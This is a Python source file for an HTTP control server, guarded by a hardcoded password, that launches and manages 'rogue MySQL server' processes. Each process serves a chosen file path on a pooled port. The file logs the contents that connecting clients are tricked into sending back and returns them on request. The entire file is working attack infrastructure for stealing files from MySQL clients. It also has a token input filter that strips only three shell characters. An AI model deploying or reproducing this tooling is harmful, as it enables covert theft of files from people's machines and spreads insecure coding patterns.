import socket
import threading
import subprocess
import json

import sys

password = "ebf734024jto485" #Web Server access password
port = 1921 #Web Server Listening Port
pythonPath = '/usr/bin/python'

# #port pool range.Must make sure they have not be used
portPool = []
rogueMysqlServerMap = {}

for p in range(2000,3000):
	portPool.append(p)

#Do some action such as encode/encrypt
def beforeSendData(conn, res):
	return res

def sendData(conn, res):
	res = beforeSendData(conn, res)

	content = "HTTP/1.1 200 ok\r\nContent-Type: application/json\r\n\r\n"
	tmp = {
		'code': str(res['code']),
		'msg': res['msg']
	}

	tmp = json.dumps(tmp, ensure_ascii=False)
	content = content + tmp

	conn.sendall(content.encode('utf-8'))

def checkPort(port):
	res = {}
	s = socket.socket()
	try:
		s.connect(('127.0.0.1', int(port)))
		s.shutdown(2)
		res['code'] = 0
		res['msg'] = 'port has be used'
	except socket.error:
		res['code'] = 1
		res['msg'] = 'port is avaliable'
	finally:
		s.close()

	return res

def safeFilter(s):
	#defend command inject?
	s = s.replace("&", "", )
	s = s.replace("|", "", )
	s = s.replace("$", "", )
	return s


def generateRogueMysqlServer(serverCode, outFile, serverFile, port):
	global pythonPath
	rogueMysqlServerMap[serverCode] = {}

	#safe filter:
	serverCode = safeFilter(serverCode)
	outFile = safeFilter(outFile)
	serverFile = safeFilter(serverFile)

	try:
		ret = subprocess.Popen(
			[
				pythonPath,
				'rogue_mysql_server.py',
				'-f',
				serverFile,
				'-o',
				outFile,
				'-p',
				str(port),
			],
			stdout=subprocess.PIPE
		)
		rogueMysqlServerMap[serverCode]['instance'] = ret
		rogueMysqlServerMap[serverCode]['code'] = 1
		rogueMysqlServerMap[serverCode]['msg'] = str(port)
	except OSError:
		rogueMysqlServerMap[serverCode]['code'] = 0
		rogueMysqlServerMap[serverCode]['msg'] = "python subprocess os error!"
	return 0


def instantiateRogueMysqlServer(serverCode, serverFile, port):
	#Instantiate a Rogue Mysql Server
	outFile = './result/' + serverCode + '.log'
	generateRogueMysqlServer(serverCode, outFile, serverFile, port)

	code = rogueMysqlServerMap[serverCode]['code']
	msg = rogueMysqlServerMap[serverCode]['msg']

	if code == 0:
		del(rogueMysqlServerMap[serverCode])

	return {
		'code': code,
		'msg': msg
	}


def readInfo(serverCode, serverSqlRandomString):
	res = {}
	try:
		readFile = './result/' + serverCode + '.log'
		f = open(readFile, 'r')
		c = f.read()
		f.close()
		tmp = c.split(serverCode + serverSqlRandomString)[1]
		#fixed end string
		tmp = tmp.split('--------------result off--------------')[0]

		res = {
			'code': 1,
			'msg': tmp
		}
	#split content error,return all content.
	except IndexError:
		res = {
			'code': 2,
			'msg': c
		}
	except:
		res = {
			'code': 0,
			'msg': 'read mysql log file error!May be '
		}

	return res

def destroy(serverCode):
	global rogueMysqlServerMap
	global portPool
	res = {}
	instance = rogueMysqlServerMap[serverCode]['instance']
	instance.terminate()

	port = rogueMysqlServerMap[serverCode]['msg']

	del(rogueMysqlServerMap[serverCode])

	#give back the port to ports pool
	portPool.append(int(port))

	return {
		'code': 1,
		'msg' : 'destroied'
	}


def operation(serverOperation, serverCode, serverFile, serverSqlRandomString):
	global portPool
	global rogueMysqlServerMap

	res = {}

	if serverOperation == "instantiate":
		# Check serverCode
		if rogueMysqlServerMap.get(serverCode, None) != None:
			return {
				'code': 0,
				'msg': 'serverCode has exist'
			}

		#get a port from port pool
		# Check port is used
		while True:
			port = 0
			try:
				port = portPool.pop(0)
			except IndexError:
				res['code'] = 0
				res['msg'] = 'port is used out!'
				return res

			isAvaliable = checkPort(port)
			if(isAvaliable['code'] == 1):
				break
			else:
				# send port back
				portPool.append(port)
		res = instantiateRogueMysqlServer(serverCode, serverFile, port)

	elif serverOperation == "readInfo":
		#Check serverCode
		if rogueMysqlServerMap.get(serverCode, None) != None:
			res = readInfo(serverCode, serverSqlRandomString)
		else:
			res = {
				'code': 0,
				'msg': 'serverCode not exist'
			}

	elif serverOperation == "destroy":
		# Check serverCode
		if rogueMysqlServerMap.get(serverCode, None) != None:
			res = destroy(serverCode)
		else:
			res = {
				'code': 0,
				'msg': 'serverCode not exist'
			}

	else:
		res = {
			'code': 0,
			'msg': 'Unknow operation'
		}

	return res


def server(conn, addr):
	global password

	try:
		request = str(conn.recv(1024),"utf-8")
		method = request.split(' ')[0]
		src  = request.split(' ')[1]

		#Log
		# logfile = open("rms_server_log.txt","a")
		# logfile.write('Connect by: ip=' + addr[0] + " port=" + str(addr[1]) + "\n")
		# logfile.write("[+] url=" + src + "\n")
		# logfile.close()

		#get input arguments
		serverPassword = src.split('/')[1]
		serverOperation = src.split('/')[2]
		serverCode = src.split('/')[3]
		serverSqlRandomString = src.split('/')[4]
		serverSqlRandomString = serverSqlRandomString.split('?x=')[0]
		serverFile = src.split('?x=')[1]

		#Verify password
		if method != "GET" or serverPassword != password:
			conn.close()
			return

		#distribute operation
		res = operation(serverOperation, serverCode, serverFile, serverSqlRandomString)

		sendData(conn, res)

	except IndexError:
		print("Not Http Request or other error....")
	finally:
		conn.close()

try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(('0.0.0.0', port))
	sock.listen(1)
except socket.error:
	print("socket server error,check your port")

while True:
	try:
		conn, addr = sock.accept()
		threading.Thread(target=server,args=(conn, addr)).start()
	except OSError as e:
		print(e.strerror)